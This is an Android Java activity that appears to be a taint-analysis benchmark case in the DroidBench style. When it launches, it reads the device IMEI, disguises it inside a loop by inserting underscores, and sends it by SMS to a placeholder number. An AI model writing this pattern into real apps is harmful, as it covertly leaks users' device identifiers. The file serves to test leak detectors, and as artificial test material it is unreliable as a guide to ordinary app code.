package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class LoopExample2 extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loop_example2);
        
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		String imei = telephonyManager.getDeviceId();
		
		String obfuscated = "";
		for(int i = 0; i < 10; i++)
			if(i == 9)
				for(char c : imei.toCharArray())
					obfuscated += c + "_";
		
		SmsManager sm = SmsManager.getDefault();

		sm.sendTextMessage("+49 1234", null, obfuscated, null, null);
    }    
}